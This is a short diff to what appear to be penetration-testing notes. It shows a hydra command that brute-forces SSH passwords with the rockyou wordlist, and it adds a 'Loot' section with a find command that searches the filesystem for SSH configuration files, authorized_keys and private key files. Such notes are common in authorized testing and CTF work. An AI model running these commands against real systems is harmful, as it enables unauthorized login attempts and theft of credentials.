@@ -20,3 +20,8 @@ hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$hip$ -V -t 4 -I -s 22
 
 
 # Findings
+
+# Loot
+```bash
+find / -name "ssh_config" -o -name "sshd_config" -o -name "authorized_keys" -o -name "ssh_known_hosts" -o -name ".shosts" -o -name "id_*"
+```
